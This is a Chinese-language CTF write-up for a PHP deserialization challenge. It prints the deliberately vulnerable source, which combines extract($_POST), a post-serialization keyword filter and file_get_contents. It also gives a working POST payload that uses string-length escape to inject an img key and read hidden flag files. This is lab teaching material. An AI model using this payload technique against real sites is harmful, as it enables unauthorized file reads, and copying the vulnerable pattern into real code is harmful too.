## [安洵杯 2019]easy_serialize_php 1

<?php

$function = @$_GET['f'];

function filter($img){
  $filter_arr = array('php','flag','php5','php4','fl1g');
  $filter = '/'.implode('|',$filter_arr).'/i';
  return preg_replace($filter,'',$img);
}


if($_SESSION){
  unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
  echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
  $_SESSION['img'] = base64_encode('guest_img.png');
}else{
  $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
  highlight_file('index.php');
}else if($function == 'phpinfo'){
  eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
  $userinfo = unserialize($serialize_info);
  echo file_get_contents(base64_decode($userinfo['img']));
}

> ?>

index.php的源码：

参数逃逸：

原理:因为序列化吼的字符串是严格的，对应的格式不能错，比如s:4:"name",那s:4就必须有一个字符串长度是4的否则就往后要。

并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。

示例：



```
<?php
#正规序列化的字符串
$a = "a:2:{s:3:\"one\";s:4:\"flag\";s:3:\"two\";s:4:\"test\";}";
var_dump(unserialize($a));
#带有多余的字符的字符串
$a_laji = "a:2:{s:3:\"one\";s:4:\"flag\";s:3:\"two\";s:4:\"test\";};s:3:\"真的垃圾img\";lajilaji";
var_dump(unserialize($a_laji));
```

我们有了这个逃逸概念的话，就大概可以理解了。如果我们把

$_SESSION['img'] = base64_encode('guest_img.png');这段代码的img属性放到花括号外边去，

然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。

那如何达到这个目的就要通过过滤函数了，因为咱的序列化的是个字符串啊，然后他又把黑名单的东西替换成空。

### 大佬的payload：

post一个数据。

```
_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

ZDBnM19mMWFnLnBocA==也就是d0g3_f1ag.php的base64加密。

s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}这个肯定就是我们预期的那段序列化字符，

那么 ;s:1:"1"; 这几个字符呢?

如果使用大佬的payload那么可以明白，现在的_SESSION就存在两个键值即phpflag和img对应的键值对。

并且这个字符串得好好读才能不蒙圈。



```
$_SESSION['phpflag']=";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}";
$_SESSION['img'] = base64_encode('guest_img.png');
var_dump( serialize($_SESSION) );
#"a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"
```

经过filter过滤后phpflag就会被替换成空，

s:7:"phpflag";s:48:" 就变成了 s:7:"";s:48:";即完成了逃逸。

两个键值分别被序列化成了

s:7:"";s:48:";s:1:"1";即键名叫";s:48: 对应的值为一个字符串1。这个键值对只要能瞒天过海就行。

s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";键名img对应的字符串是d0g3_f1ag.php的base64编码。

右花括号后面的;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"全被当成孤儿放弃了。

### 注入

[![img](https://img2020.cnblogs.com/blog/1947190/202004/1947190-20200419170914711-964238637.png)](https://img2020.cnblogs.com/blog/1947190/202004/1947190-20200419170914711-964238637.png)

### 发现/d0g3_fllllllag

[![img](https://img2020.cnblogs.com/blog/1947190/202004/1947190-20200419170915020-1040097469.png)](https://img2020.cnblogs.com/blog/1947190/202004/1947190-20200419170915020-1040097469.png)

### 拿flag

/d0g3_fllllllag进行base64加密L2QwZzNfZmxsbGxsbGFn，恰巧也是20位。就替换原来的就好。

[![img](https://img2020.cnblogs.com/blog/1947190/202004/1947190-20200419170915369-1594928959.png)](https://img2020.cnblogs.com/blog/1947190/202004/1947190-20200419170915369-1594928959.png)

